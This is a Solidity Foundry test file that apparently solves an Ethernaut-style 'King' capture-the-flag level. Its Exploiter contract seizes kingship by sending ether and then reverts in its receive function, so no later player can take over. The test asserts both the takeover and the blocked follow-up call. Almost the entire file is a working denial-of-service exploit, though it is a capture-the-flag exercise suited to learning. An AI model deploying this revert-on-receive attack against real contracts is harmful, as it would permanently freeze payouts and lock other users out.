pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "forge-std/console.sol";
import "forge-std/console2.sol";

import "src/10.sol";

contract Exploiter {

    constructor() payable {
        require(msg.value == 2 ether);
    }

    function exploit(address instance) external {
        (bool success,) = instance.call{value: address(this).balance}("");
        require(success, "Error sending the Ether to instance");
    }

    receive() external payable { 
        revert(":)");
    }
}

contract Test10 is Test {

    address user = address(0x1);
    address owner = address(0x2);
    King instance;
    
    function setUp() public {
        vm.deal(owner, 2 ether);
        vm.prank(owner);
        instance = new King{value: 1 ether}();

        vm.deal(user, 3 ether);
    }

    function testSolve() public {
        Exploiter exploiter = new Exploiter{value: 2 ether}();
        
        address previousKing = instance._king();
        console.log("Previous King: ", previousKing);

        uint prize = instance.prize();

        console.log("Current Prize: ", prize);
        
        exploiter.exploit(address(instance));

        address newKing = instance._king();
        console.log("New King: ", newKing);

        assertEq(newKing, address(exploiter));

        Exploiter exploiter2 = new Exploiter{value: 2 ether}();
        
        // Expect a revert on the next call
        // The exploiter will not receive the ether back
        // because the receive function has a revert()
        vm.expectRevert();
        exploiter2.exploit(address(instance));
    }

}